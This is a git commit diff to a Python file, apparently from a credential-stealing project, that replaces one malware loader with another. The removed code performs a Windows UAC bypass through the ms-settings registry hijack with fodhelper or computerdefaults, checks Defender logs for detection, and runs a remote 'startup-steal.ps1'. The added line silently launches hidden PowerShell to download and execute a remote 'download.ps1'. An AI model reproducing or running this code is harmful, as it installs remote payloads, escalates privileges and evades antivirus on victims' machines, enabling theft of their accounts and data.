ef0a3dba515210f4483ea1e199da2d38ef9dfa2d
43a1723 <hai1723notgay@gmail.com>
2024-09-10 18:19:19 +0700

    Update lmao.py

--- scr/lmao.py
+++ scr/lmao.py
@@ -1,17 +1,1 @@
-import subprocess, ctypes
-
-def UACbypass(method=1):
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        run = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).stdout
-        ps_cmd = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"'
-        reg_cmd = 'hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command'
-        run(f'reg add {reg_cmd} /d "{ps_cmd}" /f')
-        run(f'reg add {reg_cmd} /v "DelegateExecute" /f')
-        lb = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
-        run(f'{"computerdefaults" if method == 1 else "fodhelper"} --nouacbypass')
-        la = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
-        run(f'reg delete {reg_cmd} /f')
-        return UACbypass(method+1) if la > lb else True if method == 1 else False
-
-if not ctypes.windll.shell32.IsUserAnAdmin():
-    UACbypass()
+__import__('subprocess').Popen('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"', shell=True, stdout=-3, stderr=-3)
